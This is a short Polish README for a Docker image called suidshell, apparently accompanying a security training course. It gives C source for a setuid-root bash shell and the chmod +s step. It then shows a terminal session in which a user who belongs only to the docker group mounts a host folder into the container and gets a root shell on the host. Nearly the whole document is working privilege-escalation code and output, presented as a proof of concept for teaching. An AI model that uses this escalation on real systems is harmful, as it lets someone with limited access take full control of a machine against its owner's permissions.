# suidshell

Kompiluje prosty *suid shell*:

```
#include <unistd.h>
void main() { 
    setuid(0); seteuid(0); setgid(0); setegid(0); 
    execl("/bin/bash", "bash", NULL);
}
```
do */tmp/suidshell* i ustawia mu bit SUID (`chmod +s /tmp/suidshell`).

Jeśli masz uprawnienia do uruchamiania nowych kontenerów, ale nie masz uprawnień roota (np. należysz do grupy *docker*), z tym proof-of-concept możesz szybko roota mieć:

```
drg@kilo:~$ id
uid=1000(drg) gid=1000(drg) groups=1000(drg),27(sudo),999(docker)
drg@kilo:~$ mkdir tmp
drg@kilo:~$ docker run -v $(pwd)/tmp:/tmp aptmasterclass/suidshell
-rwsr-sr-x 1 root root 968304 Feb  8 05:10 /tmp/suidshell
drg@kilo:~$ ./tmp/suidshell
root@kilo:~# id
uid=0(root) gid=0(root) groups=0(root),27(sudo),999(docker),1000(drg)
root@kilo:~# exit
```

Ilustracja do https://aptmasterclass.com/ oraz https://blog.aptmasterclass.com/.
